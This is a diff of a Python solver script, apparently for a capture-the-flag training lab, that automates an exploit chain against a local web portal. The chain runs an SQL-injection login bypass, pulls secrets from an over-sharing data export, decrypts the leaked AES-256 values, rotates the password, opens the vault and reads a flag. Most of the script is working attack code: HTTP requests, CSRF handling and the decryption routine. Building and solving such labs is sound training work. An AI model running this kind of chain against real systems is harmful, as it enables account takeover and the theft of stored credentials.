@@ -22,15 +22,15 @@ from cryptography.hazmat.primitives import padding
 from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
 
 
-def aes_decrypt(blob: str, secret: str) -> dict:
+def aes_decrypt(blob: str, secret: str) -> str:
     """Decrypt the encode-decode.com AES-256 scheme: key = secret zero-padded to
-    32 bytes, IV = zeros, CBC, PKCS#7."""
+    32 bytes, IV = zeros, CBC, PKCS#7. Returns the plain value string."""
     key = secret.encode()[:32].ljust(32, b"\x00")
     ct = base64.b64decode(blob)
     dec = Cipher(algorithms.AES(key), modes.CBC(b"\x00" * 16)).decryptor()
     padded = dec.update(ct) + dec.finalize()
     unp = padding.PKCS7(algorithms.AES.block_size).unpadder()
-    return json.loads(unp.update(padded) + unp.finalize())
+    return (unp.update(padded) + unp.finalize()).decode()
 
 BASE = (sys.argv[1] if len(sys.argv) > 1 else "http://127.0.0.1:8000").rstrip("/")
 USERNAME = sys.argv[2] if len(sys.argv) > 2 else "abraham"
@@ -51,19 +51,20 @@ print("[1] SQLi auth-bypass login  -> OK (session established)")
 
 # 2. Over-sharing data export.
 export = s.get(f"{BASE}/portal/profile/data/").json()
-assert "vault_key" in export and "vault_blob" in export, "[2] export missing fields"
+assert "vault_algorithm_key" in export and "encrypted_vault_password" in export, "[2] export missing fields"
 print("[2] Data export leak        -> OK", list(export.keys()))
 
 
-# 3. Decrypt both AES-256 blobs (encode-decode.com scheme).
-acct = aes_decrypt(export["account_blob"], export["account_key"])
-creds = aes_decrypt(export["vault_blob"], export["vault_key"])
-print("[3] AES-256 decrypt          -> OK account:", acct, "| vault:", creds)
+# 3. Decrypt the two AES-256 values (encode-decode.com scheme); id is plaintext.
+password = aes_decrypt(export["encrypted_password"], export["algorithm_key"])
+vault_id = export["vault_id"]
+vault_password = aes_decrypt(export["encrypted_vault_password"], export["vault_algorithm_key"])
+print(f"[3] AES-256 decrypt          -> OK password: {password} | vault: {vault_id} / {vault_password}")
 
 # 4. Negative check: opening the vault before rotating must be gated (403).
 s.get(f"{BASE}/portal/vault/")  # prime csrf cookie
 r = s.post(f"{BASE}/portal/vault/",
-           data={"vault_id": creds["vault_id"], "vault_password": creds["vault_password"]},
+           data={"vault_id": vault_id, "vault_password": vault_password},
            headers={"X-CSRFToken": csrf(), "Referer": BASE})
 assert r.status_code == 403, f"[4] expected 403 before rotation, got {r.status_code}"
 print("[4] Vault gated before rotate-> OK (403)")
@@ -76,17 +77,17 @@ r = s.post(f"{BASE}/portal/rotate/",
 assert r.status_code == 302, f"[5] rotate failed: {r.status_code}"
 print("[5] Rotate password          -> OK")
 
-# 6. Open the vault with the decrypted credentials.
+# 6. Open the vault with the decrypted credentials (auto-closes the case).
 s.get(f"{BASE}/portal/vault/")
 r = s.post(f"{BASE}/portal/vault/",
-           data={"vault_id": creds["vault_id"], "vault_password": creds["vault_password"]},
+           data={"vault_id": vault_id, "vault_password": vault_password},
            headers={"X-CSRFToken": csrf(), "Referer": BASE})
 assert r.status_code == 200, f"[6] vault open failed: {r.status_code}"
-print("[6] Open vault               -> OK")
+print("[6] Open vault               -> OK (case auto-closed)")
 
 # 7. Read the loot -> the flag.
 loot = s.get(f"{BASE}/portal/vault/loot/").text
 flag = next(l.split("FLAG:")[1].strip() for l in loot.splitlines() if l.startswith("FLAG:"))
 print("[7] Loot flag                ->", flag)
 
-print("\nFULL CHAIN OK. Submit the flag on the mission page as the assigned student.")
+print("\nFULL CHAIN OK. Breaching the vault auto-closed the case on the operations board.")
